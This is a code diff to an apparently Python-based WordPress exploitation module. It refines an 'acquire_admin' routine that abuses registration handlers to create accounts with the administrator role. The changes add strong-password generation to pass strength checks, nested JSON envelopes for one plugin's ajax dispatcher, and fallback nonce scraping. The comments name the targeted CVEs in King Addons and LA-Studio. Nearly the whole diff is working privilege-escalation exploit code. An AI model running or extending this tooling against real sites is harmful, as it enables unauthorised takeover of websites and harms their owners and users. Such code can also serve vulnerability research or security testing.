@@ -23,16 +23,37 @@ One further kind is CONFIRM-ONLY (not fully automatable):
                     fires (endpoint accepts an arbitrary email for a valid
                     user → 200 + success marker) and returns {'confirmed_oob'}.
 """
+import json
 import re
 import secrets
+import string
 
 from . import exploit as _exploit  # reuse the JS-localized nonce scraper
+
+
+def _strong_password(length=16):
+    """A random password that clears the strength gates some registration
+    handlers enforce before creating the account (e.g. King Addons
+    CVE-2025-6325's Security_Manager::validate_password_strength wants >=8 chars
+    and 3-of-4 character classes). A bare hex token clears length but only hits
+    two classes, so the account is silently never created and the privesc looks
+    like it failed for an unrelated reason. Guarantee 4-of-4 (upper/lower/digit/
+    special) so it survives any such gate."""
+    specials = "!@#$%^&*"
+    pools = [string.ascii_uppercase, string.ascii_lowercase,
+             string.digits, specials]
+    chars = [secrets.choice(p) for p in pools]           # one from each class
+    alphabet = "".join(pools)
+    chars += [secrets.choice(alphabet)
+              for _ in range(max(length, 12) - len(chars))]
+    secrets.SystemRandom().shuffle(chars)                # don't front-load them
+    return "".join(chars)
 
 
 def _random_creds():
     user = "svc_" + secrets.token_hex(4)
     return {"username": user, "email": f"{user}@mail.invalid",
-            "password": secrets.token_hex(12)}
+            "password": _strong_password()}
 
 
 def acquire_admin(base_url, http, recipe, creds=None):
@@ -60,14 +81,27 @@ def acquire_admin(base_url, http, recipe, creds=None):
 
 def _register_role(base, http, recipe, creds):
     creds = creds or _random_creds()
-    data = dict(recipe.get("extra_params", {}))    # static fields the form requires
-    data["action"] = recipe["action"]
-    data[recipe.get("user_field", "user_login")] = creds["username"]
-    data[recipe.get("email_field", "email")] = creds["email"]
-    data[recipe.get("pass_field", "password")] = creds["password"]
+    fields = dict(recipe.get("extra_params", {}))    # static fields the form requires
+    fields[recipe.get("user_field", "user_login")] = creds["username"]
+    fields[recipe.get("email_field", "email")] = creds["email"]
+    fields[recipe.get("pass_field", "password")] = creds["password"]
     if recipe.get("pass_confirm_field"):
-        data[recipe["pass_confirm_field"]] = creds["password"]
-    data[recipe["role_param"]] = recipe.get("role_value", "administrator")
+        fields[recipe["pass_confirm_field"]] = creds["password"]
+    fields[recipe["role_param"]] = recipe.get("role_value", "administrator")
+    envelope = recipe.get("envelope")
+    if envelope:
+        # Some ajax dispatchers (LA-Studio's lakit_ajax, CVE-2026-0920) batch
+        # several sub-actions into one request: the top-level `action` names
+        # the DISPATCHER, and the real feature action + its fields are nested
+        # as JSON under `actions`: {"<id>": {"action": <subaction>, "data":
+        # {...fields...}}}. A nonce for such dispatchers lives at the top
+        # level, not inside `data` -- handled below same as the flat case.
+        data = {"action": recipe["action"],
+                "actions": json.dumps({envelope.get("id", "0"):
+                                       {"action": envelope["subaction"], "data": fields}})}
+    else:
+        data = fields
+        data["action"] = recipe["action"]
     # Many real registration handlers require a nonce lifted from the form page.
     # Some print it as a hidden <input> (nonce_from.field); others localize it
     # into a page's JS instead (nonce_from.key, e.g. King Addons CVE-2025-6325's
@@ -82,6 +116,15 @@ def _register_role(base, http, recipe, creds):
         else:
             nonce = _exploit._harvest_js_nonce(http, base + nf["url"], nf["key"],
                                                object_name=nf.get("object"))
+            # A JS-localized nonce may only render on the page that shows the
+            # widget (King Addons prints register_nonce solely where the
+            # Login|Register widget is placed, never on the front page). When the
+            # configured url yields nothing, discover that page via wp-json --
+            # otherwise registration is rejected "Security check failed" and no
+            # admin is created (the live cve-kingaddons failure mode).
+            if not nonce:
+                nonce = _exploit._harvest_js_nonce_from_pages(
+                    http, base, nf["key"], object_name=nf.get("object"))
             param = nf.get("param", nf["key"])
         if nonce:
             data[param] = nonce
